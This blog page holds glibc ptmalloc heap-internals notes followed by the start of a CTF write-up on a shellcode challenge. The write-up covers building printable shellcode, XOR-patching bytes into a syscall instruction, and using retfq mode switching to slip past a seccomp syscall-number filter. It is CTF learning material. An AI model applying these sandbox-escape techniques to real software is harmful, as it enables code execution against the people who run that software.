<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在<code>malloc_state</code>中有两个链表，分别为<code>fastbinY[]</code>和<code>bins[]</code>，<code>fastbinsY[]</code>属于<code>fast bins</code>，而在<code>bins[]</code>中被划分了三个区域，分别属于<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code></p>
<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>一个线程的arena可以有多个堆（除了main_arena），每个堆都有属于自己的header。每个线程的arena在最开始的时候都只有一个堆，但当这个堆空间快用完的时候，新的堆空间（与原来堆空间不连续）就会被mmap()系统调用分配到这个arena中。</p>
<p>main_arena没有多个堆，因此没有heap_info结构。当main_arena的空间不足的时候，其会使用sbrk()系统调用在原来的堆段上扩展空间，直到碰到mmap段。（这里不是很懂，主线程里申请的空间超过阈值时不也会使用mmap吗，那为什么说main_arena没有多个堆）</p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>用户申请内存的单位，也是堆管理器管理内存的基本单位。</p>
<p>glibc中用一个结构体定义了chunk，其中包含6个控制信息，不同的chunk所用到的控制信息的数量不尽相同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">	INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">	INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">	<span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a>malloced chunk</h4><p>如<code>void* ptr = malloc(0x100);</code>这条语句执行完毕后就会得到一个malloced chunk。一个malloced chunk的头部有两个字长的控制信息，剩下部分属于数据区域。如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-2.png" class>

<p>malloc()返回的指针指向该chunk的<strong>数据区域</strong></p>
<p>同时当我们<code>malloc(0x100)</code>的时候这个<code>0x100</code>对应的是一个chunk的数据区的大小，而一个malloced chunk还会有两个字长的控制信息，所以实际上得到的是一个<code>0x110</code>大小的chunk</p>
<p>如果上一个chunk是free chunk，那么<code>prev size</code>用来记录这个free chunk的大小，如果上一个chunk是malloced chunk，那么<code>prev size</code>用来存储前一个chunk的数据</p>
<h5 id="prev-size的覆用问题"><a href="#prev-size的覆用问题" class="headerlink" title="prev size的覆用问题"></a>prev size的覆用问题</h5><ul>
<li><p>以64位平台为例，如执行了<code>void* ptr = malloc(0x20);free(ptr);</code>这样的操作后，再次<code>malloc(0x20)</code>的话，堆管理器因为有能刚好满足申请大小的free chunk，所以会把这块free chunk重新返回给用户使用。那么如果<code>malloc(0x28)</code>呢？实际上堆管理器会把下一块紧邻的chunk的prev size部分的一个字长也作为数据区来使用，补足缺少的0x8个字节。这时因为prev size记录的是上一个free chunk的大小，所以当上一个chunk不是free chunk的时候，prev size就不再使用，所以可以用来当作数据区的一部分。所以对于<code>malloc(0xn0)</code>和<code>malloc(0xn8)</code>，堆管理器分配给用户的空间是一样的。当有连续的malloced chunk的时候，往往这些chunk都只有一个字长的控制字段，即<code>size</code>，因为<code>prev size</code>被上一个malloced chunk用作数据区了。</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>

<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class></li>
</ul>
<p>这里的<code>size</code>控制信息记录的是自己这个chunk的总大小（包含两个字长的控制信息），同时其最低三位（3bit）同样是控制信息。</p>
<p>为什么能拿这三位用作控制信息？</p>
<p>因为一个malloed chunk的头部有两个字长的控制信息，这就意味着一个malloced chunk的大小至少不会小于八个字节（32位的两个字长），同时chunk分配时遵循一个规则：只能分配字长整数倍的chunk（如字长64位下是8，则malloc得到的chunk只能是8的整数倍），如果申请分配的内存不是字长的整数倍，则堆管理器默认分配能满足申请内存大小且是字长整数倍的内存。这就意味着如果只记录大小的话，<code>size</code>的最低三位一定是0，所以干脆就把这三位用来记录别的控制信息，而不是浪费掉用来写0。</p>
<p>其中<code>A</code>（NON_MAIN_ARENA）记录当前chunk是否不属于主线程，1表示不属于，0表示属于。<code>M</code>（IS_MAPPED）记录该chunk是否由mmap分配的，<code>P</code>(previous in use)代表上一个chunk是否在被使用，如果是1表示上一个chunk是malloced chunk，如果是0表示上一个chunk是free chunk。</p>
<h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p>如<code>free(ptr);</code>这条语句执行完毕后会改变上面语句得到的malloced chunk的结构，而不是令malloced chunk消失，这个free掉的chunk称为free chunk。</p>
<blockquote>
<p>free掉malloc分配的内存后这段内存并不会直接返还给物理内存，而是返回给堆管理器。这里涉及系统调用的问题，因为用户内存和物理内存的交互一定要进行系统调用才能进行，而频繁地进行系统调用会大量消耗资源，以缓冲区为例：</p>
<p>缓冲区的存在就是为了减少系统调用，以stdout为例，若没有缓冲区，程序每接收到一个字符就要申请一次系统调用来向屏幕进行输出，这样会频繁地进行系统调用浪费资源，而缓冲区则是用来暂时存放这些要发送的字符的空间，满足了一定条件后再申请一次系统调用一次性地将缓冲区内的内容输出到屏幕中。</p>
<p>而堆管理器其实也是类似作用，堆管理器作为操作系统和用户交互的中介，堆管理器一次性向操作系统申请超过用户需求的内存空间，然后把这些内存管理起来，这样用户在向堆管理器申请内存或释放内存时就不再需要经过系统调用，这样就大量减少了系统调用的次数。</p>
<p>系统调用消耗资源的原因是从用户态代码切换到内核态代码时需要保存各种状态值和进行各种环境的部署，最后才能执行一个系统调用的函数。</p>
</blockquote>
<p>free chunk根据chunk大小、释放的时机被分成几种：</p>
<ol>
<li>fastbin free chunk</li>
<li>smallbin free chunk</li>
<li>unsortedbin free chunk</li>
<li>largebin free chunk</li>
</ol>
<p>一个chunk被free掉之后会多形成几段控制信息，不同的free chunk所用到的控制信息不尽相同，具体如下图：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/free-chunk.jpg" class>

<ul>
<li><p><code>fd</code>（forward）指针在bin中指向下一个（非物理相邻）free chunk</p>
</li>
<li><p><code>bk</code>（backward）指针在bin中指向上一个（非物理相邻）free chunk</p>
</li>
<li><p><code>fd_nextsize</code>在large bin中指向前一个与当前chunk大小不同的第一个free chunk（不包含bin头指针）</p>
<p>（指向比自己小的链表中最大的链表的链头）</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/fd_nextsize.jpg" class></li>
<li><p><code>bk_nextsize</code>在large bin中指向后一个与当前chunk大小不同的第一个free chunk（不包含bin头指针）</p>
<p>（指向比自己大的链表中最小的链表的链头）</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bk_nextsize.jpg" class>

<ul>
<li>一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk时挨个遍历</li>
</ul>
</li>
</ul>
<p>当一个chunk被free掉时，其会检查<code>size</code>中的<code>P</code>位来判断该chunk的上一个chunk是否也是free chunk，如果同样是free chunk则这两块free chunk会被合并，同时这个free chunk（刚被释放的这个chunk）的所有控制信息会作为合并后的chunk的数据区的一部分，图例如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>

<p>有一点要注意的是这个被free掉的chunk中的所有数据在合并前后都不会被抹除，只是被作为合并后的chunk的数据区了。</p>
<h5 id="物理链表"><a href="#物理链表" class="headerlink" title="物理链表"></a>物理链表</h5><p>因为<code>prev size</code>的存在，每个chunk都知道上一个chunk的大小，这样每个chunk就知道上一个chunk的起始地址，以此类推，这样每个内存分配区就知道了自己的分配空间和分配位置</p>
<h5 id="逻辑链表"><a href="#逻辑链表" class="headerlink" title="逻辑链表"></a>逻辑链表</h5><p>有些chunk中存在<code>fd</code>、<code>bk</code>这样的指针，利用这些指针就可以构成一个逻辑链表</p>
<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/top-chunk.jpg" class>

<p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>管理arena中空闲的chunk结构，<strong>以数组的形式存在</strong>，数组元素为相应大小的chunk链表的链表头，存在于arena的malloc_state中。</p>
<ul>
<li>unsorted bin</li>
<li>fast bins</li>
<li>small bins</li>
<li>large bins</li>
<li>（tcache）</li>
</ul>
<h5 id="bin的实现思想"><a href="#bin的实现思想" class="headerlink" title="bin的实现思想"></a>bin的实现思想</h5><p>bin的作用是保管用户暂时不需要的内存空间，当用户需要重新申请内存的时候，bin会在自己的链表中寻找有没有满足需求的chunk，如果bin中有刚好满足需求的chunk，则直接把这块chunk重新分配。</p>
<p>那么要怎么知道bin中有没用正好满足需求的chunk呢？</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bin-1.jpg" class>

<p>如上的<code>fast bins</code>：每一个特定大小的bin都是<code>fast bins</code>里的一部分，bin的本质是一个数组，数组中的每一项都对应一个特定大小的chunk链表的链表头，该链表头作为一个指针指向了一个符合其大小的fastbin free chunk，然后这些相同大小的chunk通过指针指向下一个chunk的头部来形成逻辑链表，这条串起来的链表最后形成了一个bin。</p>
<p>对于fast bins，malloc分配内存时返回的就是满足需求大小的bin的链表中的最后一个chunk的数据体的地址，且fast bins中的每一个chunk的size中的P位都为1，这是为了防止chunk的合并等操作导致的速度的下降，这是fast bins的特点之一</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bin-2.jpg" class>

<p>fast bins是单向链表，其他类型的bins都是双向链表（fd指针指向下一个chunk，bk指针指向上一个chunk，第一个chunk的bk指针指向bin头，最后一个chunk的fd指针指向bin头）fd和bk其实属于数据体。</p>
<p>双向链表中，最先连接到bins中的chunk最先离开（FIFO）。</p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><ul>
<li><p>bins[1]（malloc_state中的bins数组索引为1的元素属于<code>unsorted bin</code>）</p>
</li>
<li><p>可以视为free chunk回归其所属bin之前的缓冲区</p>
</li>
<li><p>unsorted bin 中的空闲 chunk 处于乱序状态，主要有两个来源</p>
<ul>
<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
</ul>
</li>
<li><p>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO 。</p>
</li>
</ul>
<p>结构如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/unsorted-bin.jpg" class>

<p>unsorted bin的合并：</p>
<p>当有某种特殊情况，例如：用户malloc了一段在large bins范围内的chunk，且未在unsorted bin中找到这样一段满足用户需求的chunk时，就会触发unsorted bin的合并。此时就会遍历整个unsorted bin，并且把可以合并起来的（物理相邻的）chunk合并，合并完成后就把合并的chunk分类到其所属的bin中。</p>
<h4 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h4><ul>
<li>fastbinsY[]</li>
<li>单向列表</li>
<li>LIFO（last in first out）</li>
<li>管理 16、24、32、40、48、56、64 Byte的free chunk（32位下，64位就乘2）</li>
<li>其中 chunk 的 in use 位（size字段的P位）总为1</li>
<li>默认情况下（<strong>32 位系统为例</strong>）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 prev_size 和 size 字段部分的大小）</li>
</ul>
<p>结构如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/fast-bins.jpg" class>

<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><ul>
<li><p>bins[2] ~ bins[63]</p>
</li>
<li><p>62个循环双向链表</p>
</li>
<li><p>FIFO（first in first out）</p>
</li>
<li><p>管理 16、24、32、40、……、504 Bytes 的 free chunks（32位下）</p>
</li>
<li><p>每个链表中存储的 chunk 大小都一致</p>
</li>
</ul>
<p>结构如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/small-bins.jpg" class>

<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><ul>
<li>bins[64] ~ bins[126]</li>
<li>63个循环双向链表</li>
<li>FIFO</li>
<li>管理大于 504 Bytes 的 free chunks（32位下）</li>
</ul>
<p>结构如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/large-bins-1.jpg" class>

<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/large-bins-2.jpg" class>

<p>large bins跟其它bins的主要区别在于其每个bin中所管理的chunk的大小都是不固定的（如上图，一个large bin中管理了多个双向链表，同时任意两个链表之间保存的chunk大小都不一样，但是每个链表里保存的chunk大小都相同），也就是说一个large bin会维护一个大小范围内的chunk链表。</p>
<p>同时large bin使用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针来连接大小不同的链表，而每个链表中的chunk用fd和bk指针相互连接。<code>fd_nextsize</code>和<code>bk_nextsize</code>只在每个链表的链表头起作用。</p>
<p>large bin使用FIFO分配策略，将先进入的chunk设置为链头，后面插入chunk在链头的后面，取出时取出链头的下一个chunk。</p>
<p>此外，上述这些 bin 的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲 chunk 不能在一起</strong>。(需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk <strong>先</strong>放到 fast bins 的容器内。<strong>而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong>)</p>
<h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><p>tcache可以理解为super fast bin，其工作模式跟fast bin类似，同样是单向链表。在chunk存放到fast bins之前，所有的chunk都会优先存在到tcache中，tcache也会存放一些特定范围的bins。</p>
<p>在2.26和2.27的libc中，tcache没有double free检查，往后的版本新加了tcache的安全检查。</p>
<h4 id="last-reminder"><a href="#last-reminder" class="headerlink" title="last_reminder"></a>last_reminder</h4><p>刚分配的chunk被分割后剩下的部分</p>
<h3 id="另一些注意的问题"><a href="#另一些注意的问题" class="headerlink" title="另一些注意的问题"></a>另一些注意的问题</h3><p>从<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/">堆相关数据结构 - CTF Wiki</a>]</p>
<blockquote>
<p><strong>最小的 chunk 大小</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure>

<p>这里，offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针。</p>
<p><strong>最小申请的堆内存大小</strong></p>
<p>用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍。</p>
<p><strong>注：就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span></span><br><span class="line"><span class="meta">                      ~MALLOC_ALIGN_MASK))</span></span><br></pre></td></tr></table></figure>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/" class="post-title-link" itemprop="url">2021强网杯-shellcode</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-13 16:01:42 / 修改时间：21:04:27" itemprop="dateCreated datePublished" datetime="2022-03-13T16:01:42+08:00">2022-03-13</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>这题涉及的知识点比较多</p>
<h4 id="可见字符范围内的shellcode构造。"><a href="#可见字符范围内的shellcode构造。" class="headerlink" title="可见字符范围内的shellcode构造。"></a>可见字符范围内的shellcode构造。</h4><img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-1.png" class>

<p>一些shellcode的题目中存在这样的检查，如果输入不在限制的范围内则直接退出，通过检查则执行我们的输入，所以我们只能在限制的范围内构造出实现我们想要功能的shellcode</p>
<p>可用的汇编指令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">1.数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line">2.算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">3.逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">4.比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">5.转移指令:</span><br><span class="line">push 56h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, 43h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line">6.交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">xor byte ptr [esp], ah // al ^= ah</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line">7.清零:</span><br><span class="line">push 44h</span><br><span class="line">pop eax</span><br><span class="line">sub al, 44h ; eax = 0</span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi = 0</span><br></pre></td></tr></table></figure>

<p>同时因为x86中的<code>int 0x80</code>和x64中的<code>syscall</code>指令也在不可见字符范围中，所以我们不能直接输入，要通过<code>xor and sub inc dec</code>这样的算术运算来使得一些shellcode操作后变成<code>int 0x80</code>或<code>syscall</code></p>
<p>异或构造<code>syscall</code>：<code>syscall</code>的机器码对应的16进制为<code>0F 05</code>，<code>push rdx;pop rdx;</code>的机器码对应的16进制分别为<code>0x52</code>和<code>0x5a</code>，分别用<code>0x5d</code>和<code>0x5f</code>去异或即可得到<code>0F 05</code>，如下：</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-2.png" class>

<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>

<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>

<p>从<code>0x7f5031b3601d</code>处开始到<code>0x7f5031b36026</code>，一共执行完的两步异或使得原本在<code>[rax+0x31]</code>和<code>[rax+0x32]</code>处的指令<code>push rdx;pop rdx;</code>变成了指令<code>syscall</code></p>
<h4 id="retfq指令"><a href="#retfq指令" class="headerlink" title="retfq指令"></a>retfq指令</h4><p>程序通过cs寄存器来确定以64/32位模式来运行，<code>cs = 0x23</code>对应32位模式，<code>cs = 0x33</code>对应64位模式，而retfq则是用来修改cs寄存器的，其功能相当于<code>ret;pop cs</code>。</p>
<p>更详细的可以搜索这个指令的相关或者<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6645">shellcode 的艺术</a></p>
<h4 id="绕过沙箱"><a href="#绕过沙箱" class="headerlink" title="绕过沙箱"></a>绕过沙箱</h4><p>当沙箱的第一行是<code>A = sys_number</code>时，我们可以通过切换程序运行的位数来调用到在另一个位数中相同调用号的函数。如下图中，程序正常时工作在64位模式下，则这个沙箱过滤的就是64位下这些函数的系统调用号，也就是只允许调用<code>5（fstat）、37（alarm）、0（read）、9（mmap）、231（exit_group）</code>这几个系统调用，但是这里沙箱是只允许调用这些<strong>调用号</strong>，而不是只允许调用这些<strong>函数</strong>，同时我们知道32位和64位下的系统调用号对应的是不同的函数，例如64位中5号系统调用对应的是fstat函数，但是32位中5号系统调用对应的是open函数。所以我们有时就能通过切换程序工作位数的方法来调用到一些沙箱原本过滤掉的函数。</p>
